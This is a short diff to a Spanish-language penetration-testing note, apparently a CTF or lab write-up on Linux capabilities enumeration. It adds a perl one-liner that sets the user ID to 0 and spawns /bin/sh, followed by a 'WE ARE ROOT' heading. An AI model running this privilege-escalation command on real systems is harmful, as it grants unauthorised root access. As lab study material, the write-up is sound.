@@ -97,5 +97,9 @@ enumeracion de capabilitis
 tenemos el binario perl el cual usaremos para escalar privilegios
 
 ```python
-
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
+
+![[Pasted image 20240113225241.png]]
+
+### WE ARE ROOT
